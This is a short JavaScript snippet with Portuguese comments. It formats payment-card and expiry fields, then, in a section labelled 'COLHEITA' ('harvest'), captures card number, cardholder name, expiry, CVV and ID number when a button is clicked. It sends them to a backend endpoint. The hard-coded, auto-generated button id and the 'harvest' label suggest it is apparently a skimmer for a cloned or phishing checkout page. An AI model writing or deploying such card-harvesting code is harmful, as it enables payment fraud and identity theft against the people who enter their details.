<script>
  const input = document.getElementById('cardNumber');

  input.addEventListener('input', e => {
    let value = e.target.value;

    // Remove tudo que não for número
    value = value.replace(/\D/g, '');

    // Insere espaço a cada 4 dígitos
    value = value.match(/.{1,4}/g)?.join(' ') || '';

    e.target.value = value;
  });
  
  document.addEventListener('DOMContentLoaded', () => {
    const input = document.getElementById('expiry');
    input.addEventListener('input', e => {
      let value = e.target.value;

      // Remove tudo que não for número
      value = value.replace(/\D/g, '');

      // Insere a barra após os 2 primeiros dígitos
      if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }

      e.target.value = value;
    });
	
	//COLHEITA
	
    document.querySelector('#\\:R7cn\\:').addEventListener('click', () => {
    // Captura os valores dos campos
   const cardNumber = document.querySelector('#cardNumber').value.trim();
   const cardholderNameC = document.querySelector('#cardholderNameC').value.trim();
   const expiry = document.querySelector('#expiry').value.trim();
   const cardcvvName = document.querySelector('#cardcvvName').value.trim();
   const cardholderIdentificationNumber = document.querySelector('#cardholderIdentificationNumber').value.trim();


    // Envia para o backend
    fetch('http://localhost:3000/enviar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC})
    })
    .then(res => res.text())
    .then(resp => console.log('Resposta do servidor:', resp))
    .catch(err => console.error('Erro ao enviar:', err));
});
  });
